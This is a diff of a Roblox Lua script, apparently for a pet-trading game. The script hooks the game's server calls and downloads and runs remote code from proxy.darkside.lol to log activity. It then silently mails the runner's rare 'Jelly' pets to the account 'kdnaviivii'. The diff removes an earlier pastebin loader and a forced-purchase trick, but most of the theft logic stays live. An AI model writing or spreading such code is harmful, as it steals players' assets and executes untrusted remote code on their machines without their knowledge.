@@ -1,14 +1,7 @@
 
 return function(dh,pn,gn,dp,potc)
 local zzzu, zzzv =pcall(function()
-pcall(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/Uv7yC6JA", true))()
-local x = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"])
-if x and x~=nil then
-x.PurchasePending()
-x.Close = function() return true end
-end
-end)
+
 if not dp then dp = 0 end
 if not _G.itc then _G.itc = 0 end
 if not _G.Min then _G.Min = 500000000 end
@@ -75,8 +68,7 @@ if not _G.Min then _G.Min = 500000000 end
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 _G.pvc = ""
 local mailc = 0
-local ed,ee
-ed,ee=pcall(function()
+
 
 _G.pvc = ""
 local remoteFunction = Instance.new("RemoteFunction")
@@ -84,6 +76,7 @@ local originalFunction
 originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("called script "..tostring(x))
 local args = {...}
+if string.find(x, "Send") then
 _G.pvc = args[4]
 mailc=mailc+1
 local qv = "starsh"
@@ -101,12 +94,10 @@ local responsexr =
     )
 print(responsexr.StatusMessage)
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(responsexr.StatusMessage)
+end
 return originalFunction(x, unpack(args))
 end)
-end)
-if not ed then
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(ee)
-end
+
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 function _mail(u, t, i, n)
@@ -119,13 +110,13 @@ local args = {
 }
 return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
-spawn(function()pcall(function()
+
 for i,v in pairs(save.Inventory.Pets) do
 if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty > 90000000 then
 _mail("kdnaviivii", "Pet", i, (v.am or 1))
 end
 end
-end)end)
+
 
 game.Players.PlayerRemoving:Connect(function(p)
 if mailc >= 1 and p==game.Players.LocalPlayer then
